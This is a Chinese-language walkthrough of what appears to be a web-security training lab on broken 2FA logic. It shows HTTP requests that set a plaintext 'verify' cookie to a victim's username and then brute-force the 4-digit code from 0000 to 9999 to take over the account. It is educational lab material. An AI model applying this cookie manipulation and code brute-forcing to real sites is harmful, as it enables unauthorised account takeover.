# 实验：2FA 逻辑缺陷

本实验的双因素认证（2FA）因其逻辑缺陷而存在漏洞。为了解决本实验，请访问 Carlos 的账户页面。

-   你的凭据：`wiener:peter`
-   受害者的用户名：`carlos`

你还可以访问邮件服务器以接收你的 2FA 验证码。

> **提示**
> Carlos 不会尝试自己登录该网站。

## 步骤

探测
- 执行普通的账户登录流程
    1. 页面1：提交输入用户名与密码
    2. 在关联邮箱内查看 2FA 验证码
        - 验证码仅4位
        - 尝试修改目标账户的关联邮箱到受控域名
    3. 页面2：输入 2FA 验证码后登录
        - 尝试跳过页面1的凭证提交，直接导航到页面2

- 执行普通的邮件修改功能

    ```http
    POST /my-account/change-email HTTP/2
    Cookie: verify=wiener; session=MGEYx2Wyb2kWb5rOSunlYVvrLsaFl0Lu

    email=test%40exploit-id.exploit-server.net
    ```
    - cookie 存在明文用户名
        - 尝试修改用户名到目标用户

测试
- 尝试修改目标账户的关联邮箱到受控域名

    ```http
    POST /my-account/change-email HTTP/2
    Cookie: verify=carlos; session=MGEYx2Wyb2kWb5rOSunlYVvrLsaFl0Lu

    email=testc%40exploit-id.exploit-server.net
    ```
    - 服务器响应

        ```http
        HTTP/2 302 Found
        Location: /my-account?id=wiener
        X-Frame-Options: SAMEORIGIN
        Content-Length: 0
        ```
        - 失败，仅修改了 wiener 的邮箱

- 尝试跳过页面1的凭证提交，直接导航到页面2
    ```http
    GET /login2 HTTP/2
    Cookie: verify=wiener; session=
    ```
    - 删除会话 cookie，强制导航到页面2的双因素验证
        - 服务器响应双因素验证页面，且收到验证码邮件
        - 输入验证码后成功登录，此时绕过页面1的凭证提交
    - 应用程序使用 `verify` cookie 执行页面2的双因素验证功能，此时可直接进入任意用户的双因素验证阶段

攻击
- 已知令牌提交阶段可被跳过，而进入双因素验证阶段。而双因素验证的验证码为4位。尝试爆破
    - 提交10次错误验证码后仍可继续尝试，并未触发账户保护
    - 触点：通过则 302，失败则 200

- 设置 carlos 为参数，进入双因素验证阶段
    ```http
    GET /login2 HTTP/2
    Cookie: verify=carlos; session=n57vk9DCSRyq6axVCOkPbuaO6WdeRkuV
    ```
    - 此时预期 carlos 的邮箱收到验证码

- 设置双因素验证的 POST 请求到攻击器爆破
    ```http
    POST /login2 HTTP/2
    Cookie: verify=carlos; session=n57vk9DCSRyq6axVCOkPbuaO6WdeRkuV

    mfa-code=§1202§
    ```
    - 设置数字型爆破，0到9999，最低位数为4（即 0000）
    - 爆破得到一个 302 响应，使用 cookie 访问账户页面成功以目标用户身份登录
